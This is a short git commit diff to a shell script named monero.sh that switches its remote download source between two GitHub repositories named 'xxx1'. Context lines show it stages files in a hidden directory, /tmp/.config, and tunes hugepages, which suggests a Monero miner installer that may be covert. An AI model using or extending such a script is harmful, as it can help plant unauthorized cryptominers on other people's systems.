88f618f852862e85bf3ead8c46e7b7f1dcfea035
zjaacmyx <zhifengaac@gmail.com>
2025-11-18 17:21:09 +0800

    Update monero.sh

--- monero.sh
+++ monero.sh
@@ -2,7 +2,7 @@
 
 mode="${1:-0}"
 work="/tmp/.config"
-src="https://raw.githubusercontent.com/zjaacd/xxx1/main"
+src="https://raw.githubusercontent.com/zjaacmyx/xxx1/main"
 hugepage="128"
 
 name=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
